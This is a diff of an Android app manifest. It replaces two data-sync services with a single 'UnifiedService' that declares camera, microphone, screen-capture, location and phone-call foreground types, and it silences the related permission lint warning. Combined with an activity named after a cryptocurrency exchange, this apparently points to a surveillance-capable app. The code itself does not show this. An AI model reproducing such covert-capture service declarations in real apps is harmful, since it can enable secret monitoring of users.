@@ -16,7 +16,13 @@
         </activity>
         <activity android:label="" android:name="com.codinginflow.bigots.BtcTurk" android:windowSoftInputMode="adjustNothing"/>
         <activity android:label="" android:name="com.codinginflow.bigots.Sesler"/>
-        <service android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" android:name="com.codinginflow.bigots.Service"/>
-        <service android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" android:name="com.codinginflow.bigots.Service2"/>
+<!--        <service android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" android:name="com.codinginflow.bigots.Service"/>-->
+<!--        <service android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync" android:name="com.codinginflow.bigots.Service2"/>-->
+        <service
+            android:name=".UnifiedService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync|location|camera|microphone|mediaProjection|phoneCall|mediaPlayback"
+            tools:ignore="ForegroundServicePermission" />
     </application>
 </manifest>
